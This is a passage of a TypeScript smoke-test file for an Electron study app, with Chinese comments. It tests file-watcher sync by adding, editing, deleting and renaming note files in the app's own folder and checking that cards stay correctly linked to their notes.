    ok: out.importOk && out.prefixOk && out.fakeRejected && out.renameOk &&
      out.badgeOk && out.removeOk && out.inboxOk
  })
})()`

function materialsProbe(): string {
  return MATERIALS_PROBE_SRC(materialSourcePaths())
}

/* --------------------------------------------------- 文件监听（双向同步） */

function settle(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

/** 模拟外部编辑器保存：直接往文件末尾追加。Obsidian 保存落到磁盘上也是这一件事 */
function appendExternal(fileName: string, text: string): void {
  appendFileSync(join(context().notes.dir, fileName), `\n\n${text}\n`, 'utf-8')
}

/**
 * 笔记被外部删除之后，指着它的卡片必须自己解开关联。
 *
 * 只断言界面是不够的：界面那边只是把列表收起来了，卡片身上留着的 noteId
 * 才是真正会出问题的地方——用户回到课程页点「记笔记」会跳进一个空页面，
 * 而且没有任何提示说明为什么。
 */
function verifyCardUnlinked(cardId: string): boolean {
  const card = context().cards.list().find((item) => item.id === cardId)
  if (!card) {
    console.error('[smoke] 找不到关联测试用的那张卡片')
    return false
  }
  if (card.noteId !== '') {
    console.error(`[smoke] 笔记被外部删除后，卡片仍然指着 ${card.noteId}`)
    return false
  }
  console.info('[smoke] 外部删除笔记之后，卡片关联已自动解开')
  return true
}

/**
 * 改名之后卡片还得指着同一篇。
 *
 * 这一条才是「外部改名不能当成删一篇加一篇」的验金石：文件换了名字，
 * 但笔记的 id 没变（它写在文件的 frontmatter 里，认领时会原样捡回来），
 * 所以卡片的关联必须原封不动。断了就说明对账把改名拆成了删除 + 新增。
 */
function verifyCardStillLinked(cardId: string, noteId: string): boolean {
  const card = context().cards.list().find((item) => item.id === cardId)
  if (!card) {
    console.error('[smoke] 找不到改名测试用的那张卡片')
    return false
  }
  if (card.noteId !== noteId) {
    console.error(`[smoke] 外部改名把卡片关联弄断了：期望 ${noteId}，实际 ${card.noteId || '（空）'}`)
    return false
  }
  console.info('[smoke] 外部改名之后，卡片关联仍然指着同一篇')
  return true
}

/**
 * 文件监听场景。
 *
 * 来回七趟：开笔记（顺带验「自己写盘不回环」）→ 外部新增 → 外部改动 →
 * 外部删除（顺带验卡片解绑）→ 冲突选保留 → 冲突选载入 → 外部改名。
 *
 * 每一趟之间都由主进程直接写磁盘。这就是「外部编辑器」最终在做的事，
 * 只是省掉了那个编辑器——测的仍然是真实的那条路径。
 */
async function runSyncScenario(win: BrowserWindow): Promise<boolean> {
  const probe = async (script: string): Promise<Record<string, unknown>> => {
    const raw = await win.webContents.executeJavaScript(script, true)
    const parsed = JSON.parse(String(raw)) as Record<string, unknown>
    console.info('[smoke] 同步自检：', raw)
    return parsed
  }

  const seeded = context().notes.list().find((note) => note.title === '编辑器自检')
  if (!seeded) {
    console.error('[smoke] 种子里没有那篇笔记')
    return false
  }

  // —— 1. 打开笔记，并自己写一次盘
  const opened = await probe(SYNC_OPEN_PROBE)
  if (!opened['opened']) return false
  if (!opened['noEcho']) {
    console.error('[smoke] 自己写盘触发了事件回环：编辑器被重载了')
  }

  // —— 2. 外部新增一篇：列表要自己长出来
  writeFileSync(
    join(context().notes.dir, SYNC_EXTERNAL_FILE),
    `---\nid: ${SYNC_EXTERNAL_ID}\nmode: markdown\n---\n\n来自 Obsidian 的一段话\n`,
    'utf-8'
  )
  await settle(2000)
  const added = await probe(SYNC_ADD_PROBE)

  // —— 3. 外部改正在编辑的那篇：编辑器要换成磁盘上的版本
  appendExternal(seeded.fileName, EXTERNAL_APPEND_1)
  await settle(2000)
  const changed = await probe(SYNC_CHANGE_PROBE)

  // —— 4. 先让一张卡片指着那篇外部笔记，再把文件删掉
  const card = context().cards.upsert({ courseName: '外部删除联动测试', teacher: '自检' })
  context().cards.linkNote(card.id, SYNC_EXTERNAL_ID)
  rmSync(join(context().notes.dir, SYNC_EXTERNAL_FILE), { force: true })
  // 删除要两次确认才上报（用来挡「先删原文件再写新的」那种保存方式），等久一点
  await settle(3000)
  const unlinked = await probe(SYNC_UNLINK_PROBE)
  const cardOk = verifyCardUnlinked(card.id)

  // —— 5. 编辑器里有没保存的改动时，外部再改必须先问一句
  appendExternal(seeded.fileName, EXTERNAL_APPEND_2)
  await settle(2000)
  const kept = await probe(SYNC_CONFLICT_KEEP_PROBE)

  // —— 6. 同样的冲突，这次选择载入磁盘上的版本
  appendExternal(seeded.fileName, EXTERNAL_APPEND_3)
  await settle(2000)
  const loaded = await probe(SYNC_CONFLICT_LOAD_PROBE)

  // —— 7. 外部改名：文件换个名字，但 id 写在里面没动。
  // 对账必须把「改名」认成改名，而不是「删一篇 + 加一篇」——
  // 否则用户只是在 Obsidian 里改个文件名，卡片关联就无声地断了
  const renameCard = context().cards.upsert({ courseName: '外部改名联动测试', teacher: '自检' })
  context().cards.linkNote(renameCard.id, seeded.id)
  renameSync(join(context().notes.dir, seeded.fileName), join(context().notes.dir, SYNC_RENAMED_FILE))
  await settle(2500)
  const renamed = await probe(SYNC_RENAME_PROBE)
  const renameCardOk = verifyCardStillLinked(renameCard.id, seeded.id)

  await captureIfRequested(win, 'sync.png')

  return Boolean(
    opened['noEcho'] &&
      added['addOk'] &&
      changed['changeOk'] &&
      unlinked['unlinkOk'] &&
      cardOk &&
      kept['keepOk'] &&
      loaded['loadOk'] &&
      renamed['renameOk'] &&
      renameCardOk
  )
}

/** 截图落到 STUDY_BOARD_SMOKE_SHOT 所在目录下 */
async function captureIfRequested(win: BrowserWindow, fileName: string): Promise<void> {
  const base = process.env['STUDY_BOARD_SMOKE_SHOT']
  if (!base) return
  const target = join(dirname(base), fileName)
  try {
    await new Promise((resolve) => setTimeout(resolve, 700))
    const image = await win.webContents.capturePage()
    writeFileSync(target, image.toPNG())
    console.info(`[smoke] 截图已保存：${target}`)
  } catch (error) {
    console.error('[smoke] 截图失败：', error)
  }
}
